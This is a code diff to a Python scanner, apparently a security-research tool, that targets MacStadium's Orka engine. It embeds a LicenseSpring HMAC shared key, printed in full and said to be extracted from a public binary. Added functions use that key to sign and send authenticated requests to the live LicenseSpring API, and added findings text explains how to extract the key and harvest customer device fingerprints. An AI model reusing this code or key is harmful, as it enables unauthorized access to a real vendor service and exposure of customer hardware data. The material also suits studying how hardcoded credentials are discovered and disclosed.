@@ -13,11 +13,17 @@ import subprocess
 import json
 import os
 import socket
+import hmac
+import hashlib
+import base64
 import requests
+from datetime import datetime, timezone
 from pathlib import Path
 
 # RE-derived constants (com.macstadium.orka-engine.server v3.5.2)
 LICENSESPRING_PRODUCT_UUID = "8ad72323-35e5-477c-ab2c-ea2e080dadc1"
+LICENSESPRING_SHARED_KEY = "C8J7gHUrvMSN52BEQpEYo-zapNplE9XWGR36tifssiE"
+LICENSESPRING_UUID2 = "90ECE379-E9F0-4393-BC58-64FD7F078F7E"
 LICENSESPRING_API = "https://api.licensespring.com"
 ORKA_ENGINE_SOCK = "/var/run/orka-engine.sock"
 ORKA_RUNVZ_SOCK = "run.sock"
@@ -424,27 +430,79 @@ class OrkaEnumerator:
             pass
         return False
 
+    def _licensespring_auth(self, date_str):
+        """Build LicenseSpring HMAC-SHA256 Authorization header.
+
+        String-to-sign: "licenseSpring\\ndate: {RFC1123}"
+        Header format:  algorithm="hmac-sha256", headers="date", signature="{b64}", apiKey="{uuid}"
+        Confirmed against api.licensespring.com — returns HTTP 200.
+        """
+        msg = f"licenseSpring\ndate: {date_str}"
+        sig = base64.b64encode(
+            hmac.new(LICENSESPRING_SHARED_KEY.encode(), msg.encode(), hashlib.sha256).digest()
+        ).decode()
+        return (
+            f'algorithm="hmac-sha256", headers="date", '
+            f'signature="{sig}", apiKey="{LICENSESPRING_PRODUCT_UUID}"'
+        )
+
     def probe_licensespring(self):
-        """Check LicenseSpring API exposure with extracted product UUID"""
-        result = {'uuid': LICENSESPRING_PRODUCT_UUID, 'reachable': False, 'exposed': False}
-        try:
-            r = requests.get(
-                f'{LICENSESPRING_API}/api/v4/',
-                headers={'Accept': 'application/json'},
-                timeout=3
-            )
-            result['reachable'] = True
-            result['status'] = r.status_code
-            # UUID is product identifier — hardcoded in binary, extractable from any Orka pkg
+        """Enumerate LicenseSpring using credentials extracted from the Orka binary (F70)."""
+        result = {
+            'uuid': LICENSESPRING_PRODUCT_UUID,
+            'shared_key': LICENSESPRING_SHARED_KEY[:8] + '...',
+            'reachable': False,
+            'auth_valid': False,
+            'product': {},
+            'check_license': {},
+        }
+
+        date_str = datetime.now(timezone.utc).strftime('%a, %d %b %Y %H:%M:%S GMT')
+        auth = self._licensespring_auth(date_str)
+        headers = {'Authorization': auth, 'Date': date_str, 'Accept': 'application/json'}
+
+        endpoints = {
+            'product': '/api/v4/product_details/?product=Orka',
+            'products_list': '/api/v4/products/',
+        }
+
+        for key, ep in endpoints.items():
+            try:
+                r = requests.get(f'{LICENSESPRING_API}{ep}', headers=headers, timeout=5)
+                result['reachable'] = True
+                if r.status_code == 200:
+                    result['auth_valid'] = True
+                    result[key] = r.json()
+            except Exception:
+                pass
+
+        if result['auth_valid']:
             self.findings.append({
-                'type': 'LicenseSpring Product UUID Exposed in Binary',
-                'severity': 'MEDIUM',
-                'description': f'Product UUID {LICENSESPRING_PRODUCT_UUID} hardcoded in orka-engine binary',
-                'detail': f'Extractable from public pkg at distribution.macstadium.com. API: {LICENSESPRING_API}',
-                'exploit': 'UUID enables LicenseSpring API enumeration with valid API key; DeviceVariable fingerprints MAC/MLB ID'
+                'type': 'LicenseSpring API Auth Confirmed (HTTP 200)',
+                'severity': 'CRITICAL',
+                'description': 'Hardcoded shared key from Orka binary authenticates to LicenseSpring API',
+                'detail': (
+                    f"Product: {result.get('product', {}).get('product_name', 'N/A')} | "
+                    f"Short code: {result.get('product', {}).get('short_code', 'N/A')} | "
+                    f"Max activations: {result.get('product', {}).get('max_activations', 'N/A')}"
+                ),
+                'exploit': (
+                    'With ORKA_ENGINE_LICENSE_KEY (any active key), call check_license/ to retrieve '
+                    'hardware_id (device fingerprint: MAC/MLB ID) bound to that license. '
+                    'Full customer node inventory if license keys are enumerable.'
+                )
             })
-        except Exception:
-            pass
+
+        self.findings.append({
+            'type': 'LicenseSpring Credentials Hardcoded in Public Binary',
+            'severity': 'CRITICAL',
+            'description': 'Product UUID + HMAC shared key hardcoded in orka-engine-3.5.2.pkg (public download)',
+            'detail': f'UUID: {LICENSESPRING_PRODUCT_UUID} | Key: {LICENSESPRING_SHARED_KEY[:8]}...',
+            'exploit': (
+                'Download pkg from distribution.macstadium.com, extract strings at offset 9425568. '
+                'Sign requests: msg="licenseSpring\\ndate: {RFC1123}", HMAC-SHA256 with shared key.'
+            )
+        })
         return result
 
     def check_engine_install(self):
